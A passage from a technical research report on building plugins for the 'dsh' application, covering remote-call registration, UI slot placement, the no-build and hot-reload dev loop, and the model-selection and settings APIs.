and it is by far the simplest. `ctx.webServer.register({kind:'exact'|'prefix', path, handler})` and
`registerUpgrade({path, handler})` **[READ]** (`WebRoute` in `@deepseek-ai/dsh-host-webserver`, used exactly
this way by `dsh-sidekick`). The browser half then uses plain `fetch('/your-prefix/...')`. It is untyped and
bypasses the Typert/RPC layer, but it needs no generator, no descriptors, and no `$mount`. **This is what
was verified working [RAN]** (Appendix A).

**Route B — hand-written descriptors + a self-`$mount`.** Both registration points accept hand-written
values:

- Host: `ctx.typert.register({package, face:'host', schemas, model, invocations})` — documented as supported
  **[READ]**, `dsh-typert-registry/lib/index.js:413`, README:44 (*"any other owner calls
  `ctx.typert.register(contribution)` directly"*). The only codec requirement there is
  `typeof codec.schema.parse === 'function'` **[READ]**:
  ```js
  function validateCodec(codec, subject) {
    if (codec.mode === "src-json") return;
    validateNonempty(`${subject} type symbol`, codec.typeSymbol);
    if (typeof codec.schema.parse !== "function") throw new Error(`typert: ${subject} strict codec has no parse() method`);
  }
  ```
  (The *loader* path is stricter — it demands a real zod v4 instance, `'_zod' in schema` **[READ]**.)
- Client: `ctx.remote.$mount(myContribution)` — a public method **[READ]**, fiber-owned, returns a disposer.
- Decorators can be skipped entirely on the strict path: the gateway resolves the descriptor from
  `ctx.typert.local` and never reflects the prototype **[READ]**:
  ```js
  resolveDescriptor(namespace, method, endpoint) {
    const strict = this.ctx.typert.local.get(endpoint);
    if (strict !== void 0) return strict;
    if (this.ctx.typert.local.hasSeen(endpoint)) throw new TypertGatewayError("gateway/definition-unavailable", endpoint, "its strict definition was withdrawn and SRC fallback is forbidden");
    return this.resolveSrcDescriptor(namespace, method, endpoint);
  }
  ```

**Route C — the dynamic Cordis runner (no Typert artifact at all).** `dsh-cordis-client-runner` already ships a
generic bridge on the pre-mounted `remote.dynamicCordisRunner` namespace: a dynamic package's host half calls
`harness.handle(method, fn)` and the browser half calls `host.call(method, args)` **[READ]**,
`dsh-cordis-client-runner/lib/client.js:4527`:

```js
const answered = await ctx.remote.dynamicCordisRunner.invoke(pluginId, pluginRunId, method, args).catch(…);
```

Untyped JSON, `node:vm` sandbox, definition is session-scoped and process-local — but zero build pipeline.

### 3.7 Minimal end-to-end example (Route B, hand-written)

Legend: **[READ]** = every constituent verified in installed code; the composition is not.

Host package `dsh-hello`:

```json
{
  "name": "dsh-hello",
  "type": "module",
  "main": "lib/index.js",
  "exports": { ".": { "default": "./lib/index.js" } },
  "dsh": { "bundle": { "patch": "./cordis.patch.yml" } },
  "peerDependencies": {
    "@deepseek-ai/cordis": "^4.0.2",
    "@deepseek-ai/dsh-typert-protocol": "^0.1.2-rc.1",
    "@deepseek-ai/dsh-typert-registry": "^0.1.2-rc.1"
  }
}
```

```yaml
# cordis.patch.yml
- insert:
    - id: dsh-hello
      name: dsh-hello
```

```js
// lib/index.js
import { Service } from '@deepseek-ai/cordis'
import { bindTypertRemote, RemoteError } from '@deepseek-ai/dsh-typert-protocol'

const SERVICE_KEY = 'hello'   // Cordis service key AND wire namespace
const PACKAGE = 'dsh-hello'
const NameSchema = { parse: (v) => { if (typeof v !== 'string' || v === '') throw new Error('name'); return v } }
const GreetingSchema = { parse: (v) => v }

class HelloService extends Service {
  constructor(ctx) {
    super(ctx, SERVICE_KEY)
    // bindTypertRemote(this, this.name) is exactly what TypertRemoteService's
    // constructor does — see dsh-typert-protocol/lib/index.js:86.
    this.typertRemote = bindTypertRemote(this, this.name)
  }
  greet(name) {                                  // ordinary instance method
    if (typeof name !== 'string' || name === '') throw new RemoteError('hello/bad-request', 'name must be non-empty', {})
    return { greeting: `hello, ${name}`, at: Date.now() }
  }
}

export const name = 'dsh-hello'
export const inject = ['typert']

export function apply(ctx) {
  ctx.plugin(HelloService)
  ctx.effect(() => ctx.typert.register({
    package: PACKAGE,
    face: 'host',
    schemas: [],
    model: { services: [], events: [], objects: [] },
    invocations: [{
      id: `${PACKAGE}#hello/greet`,
      service: SERVICE_KEY,     // must equal the Cordis service key  (validateBinding)
      namespace: SERVICE_KEY,   // must equal typertRemote.namespace (validateBinding)
      method: 'greet',
      invocation: { kind: 'direct' },
      parameters: [{ name: 'name', wire: 'name', source: 'json',
                     codec: { mode: 'strict', typeSymbol: `${PACKAGE}#Name`, schema: NameSchema } }],
      result: { mode: 'strict', typeSymbol: `${PACKAGE}#Greeting`, schema: GreetingSchema },
    }],
  }), 'dsh-hello: remote descriptor')
}
```

Client package `dsh-hello-ui`:

```json
{
  "name": "dsh-hello-ui",
  "type": "module",
  "exports": { ".": { "default": "./lib/index.js" }, "./client": { "default": "./lib/client.js" } },
  "dsh": { "client": { "platform": "web", "inject": ["@deepseek-ai/dsh-api-remotes"] } }
}
```

```js
// lib/client.js — browser half; identical descriptor, hand-written
window.__ModuleLoader__.load({
  id: 'dsh-hello-ui',
  factory: (require) => {
    var module = { exports: {} }
    var exports = module.exports
    var CONTRIBUTION = { package: 'dsh-hello', descriptors: [ /* same object as the host invocation */ ] }

    function apply(ctx) {
      ctx.effect(() => {
        const mounted = ctx.remote.$mount(CONTRIBUTION)
        return async () => { await (await mounted)() }
      }, 'dsh-hello-ui: remote mount')

      ctx.effect(() => {
        let cancelled = false
        // Wait for the namespace service our own mount installs.
        ctx.inject(['remote.hello'], async (scoped) => {
          if (cancelled) return
          const r = await scoped.remote.hello.greet('world')
          console.log(r.ok ? r.value.greeting : `${r.error.code}: ${r.error.message}`)
        })
        return () => { cancelled = true }
      }, 'dsh-hello-ui: call')
    }

    exports.apply = apply
    exports.inject = []
    return module.exports
  },
})
```

**[READ]** for: `window.__ModuleLoader__.load({id, factory})` + `exports.apply`/`exports.inject`;
`ctx.remote.$mount` signature and fiber ownership; `{package, descriptors[]}` contribution shape;
`remote.<namespace>` service key; `{ok, value|error}` result; the whole HTTP path; `dsh.client` validation.
**Not verified:** the example was not executed (the *fetch-based* variant of the same host/client split was —
Appendix A).

---

## 4. UI SLOTS ("SEATS")

### 4.1 The mechanism

The user-facing word "seat" appears only in JSDoc; **the API word is always `slots`.** There is no
`ctx.client.seat(...)`, no `seats.contribute(...)`, no `renderSeat(...)` anywhere.

- Service: **`ctx.slots`** (`SlotRegistry`), provided by `dsh-client-ui-renderer`
  **[READ]**, `dsh-client-ui-renderer/lib/types/client/index.d.ts`:
  ```ts
  declare module '@deepseek-ai/cordis' {
    interface Events { 'slots/changed'(key: string): void; }
    interface Context {
      /** Renderer-owned UI composition registry. */
      slots: SlotRegistry;
      /** Mount face provided after the UI renderer activates. */
      uiRenderer: UiRendererService;
    }
  }
  ```
- Registration: **`ctx.slots.register(options, Component) → () => void`**, and **`ctx.slots.inject(key, cb)`**
  to wait for a slot's *declaration* lifetime.
- **A slot must be declared before anyone may register into it.** The declaration lives in a parent
  occupant's `children` table. `SlotCore.register` throws otherwise **[READ]**:
  ```
  slot "X" is not declared (a parent entry's children table must declare it)
  ```
  This is why `slots.inject(key, cb)` is mandatory for any plugin whose load order relative to the declaring
  plugin is not guaranteed.
- Slot kinds **[READ]**, `dsh-cordis-client-runner/lib/client.js:1959`:
  ```ts
  export type SlotKind = 'single' | 'list' | 'keyed' | 'chain';
  export type SlotScope = 'root' | 'session-maybe' | 'session';
  export type SlotLabel = string | (() => string);
  ```
  - `single` — one occupant per priority level. **Registering at the same priority as an existing entry
    THROWS.** Lower `priority` wins ("lowest renders"); to shadow a shipped priority-0 entry use `priority: -1`.
  - `list` — additive; a unique **`id` is required**; sorted by `(priority, order)`.
  - `keyed` — `${key}` required; the owner dispatches.
  - `chain` — a `select(owner)` fn is required; every entry participates.

### 4.2 The root declaration chain

The shell renders exactly one slot, `root`. **[READ]**, `dsh-client-ui-layout/lib/client.js:438`:

```js
const disposeRegistration = ctx.slots.register({
    name: "root",
    locale: "common",
    children: {
        "sidebar":       { kind: "single", scope: "root" },
        "conversation":  { kind: "single", scope: "session-maybe" },
        "details":       { kind: "single", scope: "session" },
        "shell.overlay": { kind: "list",   scope: "root" }
    },
    store: createLayoutStore,
    inject: (actions) => { layout.attachPanels(actions); return {}; }
}, AppFrame);
```

`ui-layout`'s `AppFrame` renders `sidebar`, `conversation`, `details`, `shell.overlay`; the composer bar
declares the input seats **[READ]**, `dsh-client-ui-conversation/lib/client.js:16160`:

```js
const registerComposerBar = () => slots.register({
    name: "conversation.composer.bar",
    locale: NS,
    children: {
        "conversation.input.attachments": { kind: "single", scope: "session-maybe" },
        "conversation.input.overlay":     { kind: "list",   scope: "session" },
        "conversation.input.left":        { kind: "list",   scope: "session" },
        "conversation.input.plan":        { kind: "single", scope: "session" },
        "conversation.input.right":       { kind: "list",   scope: "session" },
        "conversation.input.model":       { kind: "single", scope: "session" },
        "conversation.composer.dock":     { kind: "list",   scope: "session" }
    },
```

### 4.3 Full seat inventory (52), with declaring package

Extracted from every `declare module '@deepseek-ai/dsh-client-ui-slots' { interface SlotMap {…} }` block and
cross-checked against a 52-entry ledger embedded in `dsh-cordis-client-runner/lib/client.js:2135-4198`
**[READ]**. `—` = no shipped occupant.

| Seat id | kind | scope | Declared by | Shipped occupant(s) |
|---|---|---|---|---|
| `root` | single | root | client-ui-renderer | ui-layout `AppFrame` |
| `sidebar` | single | root | client-ui-layout | ui-sidebar `SidebarRoot` |
| `sidebar.brand.mark` | single | root | client-ui-sidebar | ui-brand-official |
| `sidebar.brand.name` | single | root | client-ui-sidebar | ui-brand-official |
| `sidebar.workspaces` | single | root | client-ui-sidebar | ui-workspace `WorkspaceBrowser` |
| `sidebar.workspaces.directoryFlow` | single | root | client-ui-workspace | directory-picker-{browse,native} |
| `sidebar.settings` | single | root | client-ui-sidebar | ui-settings-general `SettingsRoot` |
| `sidebar.footer.action` | list | root | client-ui-sidebar | ui-cordis `cordis-panel` |
| `conversation` | single | session-maybe | client-ui-layout | ui-conversation |
| `conversation.session` | single | session | client-ui-conversation | ui-conversation |
| `conversation.session.header` | single | session | client-ui-conversation | ui-conversation |
| `conversation.session.header.lineage` | single | session | client-ui-conversation | ui-subagent |
| `conversation.session.header.actions` | list | session | client-ui-conversation | agent-preset, jobs, schedule |
| `conversation.session.header.utilities` | list | session | client-ui-conversation | session-log-export |
| `conversation.view` | list | session | client-ui-conversation | ui-chat `chat`, ui-trajectory `trajectory` |
| `conversation.composer` | chain | session | client-ui-conversation | approval, subagent, user-questions |
| `conversation.composer.bar` | single | session-maybe | client-ui-conversation | ui-conversation `InputBar` |
| `conversation.composer.dock` | list | session | client-ui-conversation | ui-chat `StatsLine` (`stats`) |
| `conversation.input.dock` | list | session | client-ui-conversation | queue, todo, goal |
| `conversation.input.overlay` | list | session | client-ui-conversation | command-popup, slash-menu |
| `conversation.input.attachments` | single | session-maybe | client-ui-conversation | ui-attachment |
| **`conversation.input.left`** | **list** | session | client-ui-conversation | **— (free)** |
| `conversation.input.plan` | single | session | client-ui-conversation | ui-plan `PlanChip` |
| **`conversation.input.model`** | single | session | client-ui-conversation | ui-model-selection `ModelSelect` |
| **`conversation.input.right`** | **list** | session | client-ui-conversation | **— (free)** |
| `conversation.approval.detail` | single | session | client-ui-chat | ui-chat |
| `conversation.hero.brand.mark` | single | root | client-ui-conversation | — |
| `conversation.hero.workspace` | single | root | client-ui-conversation | ui-workspace |
| `conversation.hero.workspace.directoryFlow` | single | root | client-ui-workspace | directory-picker-* |
| `conversation.hero.agentPreset` | single | root | client-ui-conversation | ui-agent-preset |
| `conversation.chat.node` | keyed | session | client-ui-chat | ui-chat ×14, goal, tool, workflow-run |
| `conversation.chat.commandview` | keyed | session | client-ui-chat | — |
| `conversation.chat.assistant-actions` | list | session | client-ui-chat | ui-message-feedback |
| `conversation.chat.turnTail` | chain | session | client-ui-chat | ui-deliverables |
| `conversation.message.images` | single | session | client-ui-chat | ui-attachment |
| `conversation.details.tool` | single | session | client-ui-chat | ui-tool |
| `conversation.trajectory.images` | single | session | client-ui-trajectory | ui-attachment |
| `details` | single | session | client-ui-layout | ui-chat `DetailsPanel` |
| `settings.trigger` | single | root | client-ui-settings | ui-settings-general |
| `settings.header` | single | root | client-ui-settings | ui-settings-general |
| `settings.close` | single | root | client-ui-settings | ui-settings-general |
| `settings.action` | list | root | client-ui-settings | ui-settings-general |
| `settings.section` | list | root | client-ui-settings | agent-presets, general, models, plugins |
| `settings.general.item` | list | root | client-ui-settings | locale, chat, conversation, permission, theme ×2 |
| `settings.plugins.tab` | list | root | client-ui-settings | plugin-inventory `all`, settings-plugins `configurable` |
| `settings.plugin.item` | keyed | root | client-ui-settings-plugins | ui-settings-plugins ×4 |
| `settings.onboarding` | list | root | client-ui-settings | settings-models ×2 |
| `settings.models.provider-card` | keyed | root | client-ui-settings-models | — |
| `settings.models.footer` | list | root | client-ui-settings-models | — |
| **`shell.overlay`** | **list** | root | client-ui-layout | **— (free)** |
| `tool.call.toolview` | keyed | session | client-ui-tool | ui-tool ×9, skill, cordis ×4 |
| `tool.view.cordis` | keyed | session | client-ui-cordis | — |

### 4.4 The four requested placements

#### (a) Composer area, next to the model seat → **`conversation.input.right`**

**[READ]** render order, `dsh-client-ui-conversation/lib/client.js:15642`:

```js
children: [
  input === void 0 || sessionId === void 0 ? null : renderSlot("conversation.input.right", {}),
  sessionId === void 0 ? null : renderSlot("conversation.input.model", { locked: modelSeatLocked }),
  jsx(ContextMeter, { useProjection, t }),
  …
```

`conversation.input.right` is `kind:"list"` with **zero shipped occupants** — it is the designed additive
slot immediately before the model seat. `conversation.input.left` is its mirror on the left.

**Do not use `conversation.input.model`** for an additive widget: `single`, already occupied, same-priority
registration throws.

```js
ctx.slots.inject('conversation.input.right', () => ctx.slots.register(
  { name: 'conversation.input.right', id: 'my-widget', order: 100 },
  MyWidget,
))
```

Alternative composer-area seats: `conversation.input.dock` (list, above the card — this is where the Goal
dock lives), `conversation.input.overlay` (list, floating inside the card), `conversation.composer.dock`
(list, below the card — this is where the token-stats line lives).

#### (b) Sidebar → **`sidebar.footer.action`**

**[READ]**, `dsh-client-ui-sidebar/lib/types/client/contract/slots.d.ts:54`:

```ts
/**
 * Optional actions beside Settings at the sidebar foot. Declared by this
 * package's 'sidebar' entry; each action receives only the column state.
 */
'sidebar.footer.action': { kind: 'list'; scope: 'root'; owner: SidebarFooterActionOwnerProps; };
```

Owner props: `{ wide: boolean }` (false = the 56px rail). Render site **[READ]**,
`dsh-client-ui-sidebar/lib/client.js:246`: `children: renderSlot("sidebar.footer.action", { wide })`.
Shipped registrant: `ui-cordis` with `id: "cordis-panel"`.

```js
ctx.slots.inject('sidebar.footer.action', () => ctx.slots.register(
  { name: 'sidebar.footer.action', id: 'my-action', order: 100 },
  MyAction,
))
```

Do **not** register into `sidebar` itself — it is `single` and occupied by `SidebarRoot`; replacing it also
removes `sidebar.workspaces`, `sidebar.settings` and `sidebar.footer.action` (they are declared as its
children).

#### (c) Settings page → **`settings.section`** (own page) or **`settings.general.item`** (one row)

Both `list`, `root` scope. `settings.section` register options: `id` (**required**, the nav key), `order`
(nav position), `label` (string or `() => string`). Owner props: `{ close: () => void }`.
Shipped precedent **[READ]**, `dsh-client-ui-settings-plugins/lib/client.js:1769`:

```js
ctx.slots.inject("settings.section", () => ctx.slots.register({
    name: "settings.section", id: "plugins", order: 15, label: () => t("nav"), locale: NS,
    inject: sectionInjected,
    children: { "settings.plugins.tab": { kind: "list", scope: "root" } }
}, PluginsSettingsSection));
```

```js
ctx.slots.inject('settings.section', () => ctx.slots.register(
  { name: 'settings.section', id: 'my-section', order: 100, label: 'My plugin' },
  MySettingsSection,
))
```

`settings.models.provider-card` (`keyed`, dispatched by settings namespace) is the one seat that hands a
plugin both provider identity and credential-configured state — `ProviderCardExtrasOwnerProps`:
`{ provider: ProviderDirectoryEntry; configured: boolean; keyConfigured: boolean }` **[READ]**,
`dsh-client-ui-settings-models/lib/types/client/slot-contract.d.ts`, whose header says it is exactly
*"the two seats through which a plugin distributed outside this repository adds UI to the Models settings
section without editing it."*

#### (d) Status bar / top bar → **`shell.overlay`**

**There is no seat named `statusbar`, `status.bar`, `topbar`, `toolbar`, or `header.bar`.** None of the 52
ids matches those substrings.

**[READ]**, `dsh-client-ui-layout/lib/types/client/index.d.ts:67`:

```ts
/**
 * Frame-wide floating layer, above every column and outside their scroll
 * containers. Deliberately generic and unowned by any feature: a badge, a
 * toast stack or a status pill all belong here, and entries order among
 * themselves. The layer itself is click-through — entries opt back into
 * pointer events — so an occupant never blocks the app underneath.
 *
 * This is the additive seat for a frame-wide surface of your own: a fresh
 * `id` is added beside the shipped entries instead of replacing them.
 */
'shell.overlay': { kind: 'list'; scope: 'root'; };
```

Render site + CSS **[READ]**, `dsh-client-ui-layout/lib/client.js:259` and its inlined module CSS:

```js
jsx("div", { className: AppFrame_module_css_default.overlayLayer, "data-shell-overlay": true,
              children: renderSlot("shell.overlay", {}) })
```
```css
.pI_x6G_overlayLayer{z-index:20;pointer-events:none;position:absolute;inset:0}
.pI_x6G_overlayLayer>*{pointer-events:auto}
```

Absolutely positioned over the whole frame (`inset: 0`, `z-index: 20`), click-through, each child opting
back in. You position your own widget inside it. **This is the seat used in the verified demo.**

```js
ctx.slots.inject('shell.overlay', () => ctx.slots.register(
  { name: 'shell.overlay', id: 'my-badge', order: 100 },
  MyBadge,
))
```

Alternative "top bar" readings: `conversation.session.header.utilities` (list, session — right-aligned
header widgets; shipped occupant `session-log-download`) and `conversation.session.header.actions`
(list, session — title-adjacent).

### 4.5 How a component is written

React 18, plain function components. Slot-scope-injected props (e.g. `sessionId`, `useProjection`,
`useSessions`, `t`) arrive as props — not passed by a parent. Real example **[READ]**,
`dsh-client-ui-jobs/lib/client.js:117`:

```js
function JobListAction({ sessionId, useSessions, t }) {
    const jobs = useSessions((state) => state.jobsBySession[sessionId]) ?? NO_TASKS;
    const [open, setOpen] = (0, react.useState)(false);
    …
    (0, _deepseek_ai_dsh_client_ui_primitives.useDismissOnOutsidePointer)(rootRef, open, setOpen);
```

The in-house UI kit is `@deepseek-ai/dsh-client-ui-primitives` (**a shell seed word**, not an installed
package). **There is no antd / MUI / arco.** ~115 exports are recoverable from the shell bundle:
`Button, CodeBlock, DiffBlock, DisclosureRow, HoverCard, Input, JsonBlock, JsonTree, MarkdownText, Menu,
MessageText, Modal, OnboardingSurface, Pill, ReadBlock, RiskConfirmation, SearchBlock, StateDot,
TerminalBlock, Toast, Tooltip, WebBlock, ConnectionIndicator, diffTotals, relativeTime, writeClipboard,
useAnchoredPosition, useAnchoredMaxHeight, useDismissOnOutsidePointer` + ~80 `Icon*` components.

---

## 5. DEV LOOP

### 5.1 Where the built client bundle must live

`exports["./client"]` resolves to a path **relative to the package root** **[READ]**,
`dsh-client-modules/lib/index.js:635`:

```js
const clientRel = clientExportOf(packageName, pkg.exports);
if (clientRel === void 0) throw new Error(`client-modules: ${packageName} declares dsh.client but exports no "./client" bundle`);
const resolved = { packageName, meta: {
  clientPath: join(dirname(pkgPath), clientRel),
  …
```

The file must **exist at boot**: a missing file is a hard composition failure with a build instruction
**[READ]**:

```js
const CLIENT_BUNDLE_BUILD_INSTRUCTION = "run `pnpm run build` before launch";
class MissingClientBundleError extends Error { … }
```
```
client-modules: client bundle not found; run `pnpm run build` before launch:
  package: <name>
  path:    <absolute path>
```

### 5.2 Does the web server serve plugin client bundles? — Yes

**[READ]**, `dsh-client-modules/lib/index.js:481`:

```js
ctx.effect(() => ctx.webServer.register({ kind: "prefix", path: "/plugins", handler: this.serveBundle }),
           "client-modules: bundle route");
```

The route serves **exact registered URLs**, not arbitrary paths **[READ]**, `serveBundle`:

```js
const requestUrl = new URL(req.url ?? "/", "http://x");
const resourceUrl = `${requestUrl.pathname}${requestUrl.search}`;
const response = this.responses.get(resourceUrl) ?? this.previousBatchResponses.get(resourceUrl);
if (response !== void 0) { res.writeHead(200, { "content-type": response.contentType, … }); res.end(…); return; }
res.writeHead(404); res.end();
```

URL shapes **[READ]**, `comboUrl`:

```js
function comboUrl(ids, rev, sourceMap = false) {
  return `/plugins/??${ids.map((id) => `${id}/client.js${sourceMap ? ".map" : ""}`).join(",")}&rev=${rev}`;
}
```

So the served URL is **always the combo form**, even for one bundle:
`/plugins/??dsh-demo-plugin/client.js&rev=<12-hex>`. `/plugins/<name>/client.js` alone is a **404**
(confirmed [RAN]). Source maps are served at the same URL + `.map` when a sibling `<clientPath>.map`
exists and parses as Source Map v3 **[READ]**, `sourceMapSnapshot`.

The boot graph is injected into the HTML as `globalThis["__DSH_BOOT__"] = {rev, entries:[{id,url,rev,inject,external?,immediately?}], batches:[{phase,url,rev,entries}]}`
**[RAN]** — 47 entries and a `bootstrap`/`application` batch pair for the web profile.

### 5.3 Is there a bundling step? — For first-party packages, yes; for you, **optional**

First-party packages build with **tsdown** (host: `lib/index.js`; client: a lazy-CJS bundle). The emitted
client bundle must have the exact shape **[READ]**:

```js
window.__ModuleLoader__.load({
	id: "<package name>",
	factory: (require) => {
		var module = { exports: {} };
		var exports = module.exports;
		Object.defineProperty(exports, Symbol.toStringTag, { value: "Module" });
		…
		exports.apply = apply;
		exports.inject = inject;
		return module.exports;
	}
});

//# sourceMappingURL=client.js.map
```

Two hard constraints from the client module system **[READ]**, `dsh-client-modules/lib/client.js`:

- the loaded file is a **classic script** (`document.createElement("script")`, no `type="module"`);
- executing twice without invalidation throws:
  `duplicate factory registration for "<id>" (bundle executed twice without invalidate?)`
- CSS must be injected **inside** the factory (at materialization), and tags are claimed via
  `data-plugin`/`data-plugin-css` — see the inlined CSS preamble in any shipped bundle.

### 5.4 Can it be plain ESM JS with no build step? — **YES. Verified.**

There is no TypeScript requirement, no bundler requirement, and no manifest pointing at a bundle output. You
hand-write `lib/client.js` in the exact shape above and put the path in `exports["./client"]`. The
`require(...)` calls resolve against the shell seed words at runtime, so `react`, `react/jsx-runtime`,
`react-dom`, `react-dom/client`, `@deepseek-ai/cordis`, `@deepseek-ai/dsh-client-store`,
`@deepseek-ai/dsh-client-ui-slots` and `@deepseek-ai/dsh-client-ui-primitives` all work with no build.

This was done in the demo: `/Users/cgeng/Workspaces/dsh-plan/research/demo-plugin/lib/client.js` is a
hand-written 60-line classic script with no `tsconfig`, no bundler, and no build step. It was served and it
rendered **[RAN]**.

What `package.json` needs:

```json
{
  "type": "module",
  "exports": { ".": { "default": "./lib/index.js" }, "./client": { "default": "./lib/client.js" } },
  "dsh": {
    "bundle": { "patch": "./cordis.patch.yml" },
    "client": { "platform": "web", "inject": [] }
  }
}
```

Caveats for the no-build route:

- **No JSX.** Use `react.createElement` / `jsxRuntime.jsx(type, props)` directly (the demo does).
- **No ESM `import` in the bundle.** The file is a classic script; use `require(...)` inside the factory.
- Anything outside the 8 seed words must be inlined by hand or fetched from another plugin's `./client`
  artifact (declared in `dsh.client.external`).
- Authoring a `.map` is optional; if you drop a `client.js.map` next to it, it must be a valid Source Map v3
  or boot throws **[READ]**, `sourceMapSnapshot`.

### 5.5 Does HMR work? — **Yes, for third-party bundles, out of the box. Verified.**

`dsh-client-hmr` is mounted **unconditionally** in the web profile (`client-hmr` row, no `disabled`) and its
node half **stat-polls every graph row's client bundle**, including yours **[READ]**,
`dsh-client-hmr/lib/index.js:6-18, 90-113`:

```js
/**
* HMR plugin, node half: the host end of the dev reload chain. One interval
* stat-polls every graph row's client bundle (polling by design: network mounts
* deliver no inotify events), reports changes through
* `clientModuleHost.rebuilt(id)`, and serves the `/plugins/events` SSE channel
* broadcasting graph/rebuilt frames to the browser half (src/client/).
* The web bundle mounts this row unconditionally: without a rebuild
* watcher rewriting client bundles, the poll observes no changes and the
* chain stays idle.
*/
const Config = z.object({ pollIntervalMs: z.number().step(1).min(1).default(500) });
```

The browser half then invalidates the row and swaps the fiber through the vendored Loader; CSS injected by
the old factory is reclaimed via `data-plugin` tags **[READ]**, `claimStyles`.

**[RAN]** Live confirmation: with `dsh --profile web --port 0` already running, `lib/client.js` was edited on
disk; within the 500 ms poll the row's revision changed (`fc0a9bc4f0b5afe2-45` → new), and the widget
appeared in the DOM **without any page reload**. No `pnpm run dev:web`, no watcher, no server restart.

Caveat: the poll compares `(mtimeMs, size)` **[READ]**, `bundleStat`. A write that preserves both is
invisible. In practice, saving a file in an editor changes `mtimeMs`.

### 5.6 Typical loop

No-build route:
1. edit `lib/client.js` → save → the running GUI reloads the plugin row within ~500 ms.

TypeScript/bundler route:
1. `pnpm tsdown --watch` (or `vite build --watch`) writing `lib/client.js` in the lazy-CJS shape;
2. same as above — HMR picks it up.

Host-half changes (`lib/index.js`) go through the **Cordis** HMR plugin
(`@deepseek-ai/cordis-plugin-hmr`), which is `disabled: true` in the web profile tree **[RAN, dump]**.
Enabling it (`- id: hmr` + `disabled: false` in the profile patch) is the documented way to hot-reload host
plugins; otherwise restart dsh. **UNKNOWN:** whether enabling it also hot-reloads a third-party host half
cleanly — not exercised.

---

## 6. MODEL SELECTION / PROVIDER SWITCHING, SETTINGS, CREDENTIALS

### 6.1 The catalog

**Host:** `ctx.llm` (`LlmRuntime`) **[READ]**, `dsh-llm/lib/types/index.d.ts`:

```ts
listProviders(): LlmProviderInfo[];                                   // { id, name }
listConfigurableProviders(): LlmConfigurableProvider[];               // { provider, displayName, settingsNs, settingsPath, declared? }
listModels(provider: string): Promise<LlmModelInfo[]>;                // { provider, id, name, description?, inputModalities? }
resolveModelInfo(provider, model, signal?): Promise<LlmResolvedModelInfo>;  // adds context, defaultMaxTokens, reasoning
```

**Browser-facing merged catalog:** `ctx.remote.session.modelCatalog()` **[READ]**,
`dsh-api-session-controller/lib/types/catalog.js:8`:

```js
export async function buildModelCatalog(ctx, defaultSelection = ctx.agentDefaultModel.currentSelection()) {
    const providers = ctx.llm.listProviders();
    const catalog = await Promise.all(providers.map(async (provider) => {
        try {
            const models = await ctx.llm.listModels(provider.id);
            const entries = await Promise.all(models.map(async (model) => {
                const resolved = await ctx.llm.resolveModelInfo(provider.id, model.id);
                const reasoning = resolved.reasoning === undefined ? undefined : {
                    efforts: resolved.reasoning.efforts.map(e => ({ id: e.id, name: e.name, ... })),
                    ...(resolved.reasoning.defaultEffort === undefined ? {} : { defaultEffort: resolved.reasoning.defaultEffort }),
                };
                return { id: model.id, name: model.name, ...(model.description === undefined ? {} : { description: model.description }), ...(reasoning === undefined ? {} : { reasoning }) };
            }));
            return { kind: 'group', group: { id: provider.id, name: provider.name, models: entries } };
        } catch (error) {
            return { kind: 'failure', failure: { id: provider.id, name: provider.name, message: … } };
        }
    }));
    return {
        default: { ...defaultSelection },
        routableProviders: providers.map(p => p.id),
        groups: catalog.flatMap(i => i.kind === 'group' ? [i.group] : []).filter(g => g.models.length > 0),
        failures: catalog.flatMap(i => i.kind === 'failure' ? [i.failure] : []),
    };
}
```

`ModelCatalog = { default: {provider, model, reasoningEffort?}, routableProviders: string[], groups: {id,name,models}[], failures: {id,name,message}[] }`
**[READ]**, `dsh-api-session-controller/lib/types/types.d.ts:102-127`.

### 6.2 Switching the current session's provider + model

**Client call — this is the exact call a plugin makes [READ]**,
`dsh-client-ui-model-selection/lib/client.js:151`:

```js
const result = await this.sessions.selectModel({
    sessionId: this.sessionId,
    provider: selection.provider,
    model: selection.model,
    ...selection.reasoningEffort === undefined ? {} : { reasoningEffort: selection.reasoningEffort }
});
```

`this.sessions` is `ctx.remote.session` (inject `"remote.session"`).

**Payload** — exactly four fields **[READ]**, `dsh-api-session-controller/lib/typert.host.js:597`:

```js
const …selectModel_parameter_0$schema = z.object({
  'sessionId': z.intersection(z.string(), z.unknown()).readonly(),
  'provider':  z.string().readonly(),
  'model':     z.string().readonly(),
  'reasoningEffort': z.string().readonly().optional(),
})
```

**Return** — `{ selected: { provider, model, reasoningEffort? } }`, the *normalized* selection after
`ctx.llm.resolveCallConfig` validated it against the adapter **[READ]**:

```js
const …selectModel_result$schema = z.object({
  'selected': z.object({
    'provider': z.string().readonly(),
    'model': z.string().readonly(),
    'reasoningEffort': z.string().readonly().optional(),
  }).readonly(),
})
```

Failures: `RemoteError('session/model-unavailable', msg, { provider, model })`. Via `ctx.remote` the caller
sees `{ok:false, error}` rather than a rejection.

**Host handler [READ]**, `dsh-api-session-controller/lib/types/commands.js:122`:

```js
async selectModel(request) {
    const agent = await this.resolveAgent(request.sessionId);
    return this.agents.serializeImageAdmission(agent, async () => {
        try {
            const resolved = await this.ctx.llm.resolveCallConfig({
                provider: request.provider, model: request.model,
                ...(request.reasoningEffort === undefined ? {} : { reasoningEffort: ReasoningEffortId(request.reasoningEffort) }),
            });
            const selected = { provider: resolved.provider, model: resolved.model,
                ...(resolved.reasoningEffort === undefined ? {} : { reasoningEffort: resolved.reasoningEffort }) };
            this.agents.selectForNextRequest(agent, selected);
            try { await this.ctx.agentDefaultModel.saveSelection(selected); }
            catch (error) { this.ctx.logger.warn(`session-controller: model selection changed for the Session but the default was not saved: ${String(error)}`); }
            return { selected: { ...selected } };
        } catch (error) { … throw new RemoteError('session/model-unavailable', …); }
    });
}
```

**⚠️ Two side effects a plugin author must know:**

1. **It writes a durable session event** — `agent.session.append('model/selection', selection)`
   **[READ]**, `dsh-api-session-controller/lib/types/agent.js:342`.
2. **It also overwrites the global default.** `ctx.agentDefaultModel.saveSelection(selected)` →
   `settings.replace("agent-default-model", { provider, model, reasoningEffort? })` → **rewrites the
   top-level `agent-default-model:` key of `/Users/cgeng/.dsh/settings.yaml`** **[READ]**,
   `dsh-agent-default-model/lib/index.js:31-72`. So switching the model in one session changes the default
   for every future session without a session-specific selection.

Scope: **per-session**, addressed by `sessionId`. Subagent sessions are refused client-side
(`"model selection is unavailable for addressed subagent sessions"`) **[READ]**.

### 6.3 Settings from a plugin

**Host** — `ctx.settings` (`SettingsProvider`) **[READ]**, `dsh-settings/lib/types/index.d.ts`:

```ts
register<const Namespace extends string, T>(
